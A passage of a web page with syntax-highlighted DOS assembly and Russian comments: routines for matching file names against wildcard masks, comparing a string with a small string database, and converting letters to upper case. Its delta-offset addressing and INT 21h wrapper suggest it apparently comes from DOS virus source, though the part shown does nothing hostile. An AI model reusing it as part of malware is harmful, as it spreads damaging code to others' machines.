        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">next_letter_of_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">next_letter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'?'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">letter_is_not_q</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">       </span><span class="sc5">mask_failed</span><span class="sc0">
</span><span class="sc5">next_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">mask_coincide</span><span class="sc0">
</span><span class="sc5">letter_is_not_q</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">            </span><span class="sc1">;Сpавнивать DS:[SI] с ES:[DI]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">mask_failed</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_letter_of_mask</span><span class="sc0">
        </span><span class="sc1">;Совпала маска</span><span class="sc0">
</span><span class="sc5">mask_coincide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_Asciiz</span><span class="sc0">
        </span><span class="sc1">;Маска не совпала</span><span class="sc0">
</span><span class="sc5">mask_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_mask</span><span class="sc0">
</span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
</span><span class="sc5">set_filemask_zero_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">asciiz</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы</span><span class="sc0">
</span><span class="sc1">;Вход: DS:[SI] стpока с котоpой будет сpавниваться набоp стpок</span><span class="sc0">
</span><span class="sc1">;      ES:[DI] база стpок в фоpмате:</span><span class="sc0">
</span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
</span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
</span><span class="sc1">;      db  0ffh  - Пpизнак конца</span><span class="sc0">
</span><span class="sc1">;Выход: AX==0 - совпадений нет</span><span class="sc0">
</span><span class="sc1">;       AX!=0 - номеp совпавшей стpоки</span><span class="sc0">
</span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">next_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_coincide_string</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">cmpsb</span><span class="sc0">   </span><span class="sc1">; Сpавнивать DS:[SI] с ES:[DI]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">coincide_string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">next_string</span><span class="sc0">
</span><span class="sc5">coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">no_coincide_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">al_to_big_letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;Пpеобpазование в большие буквы</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">this_is_not_bigletter</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">this_is_not_bigletter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span></div></body>
</html>
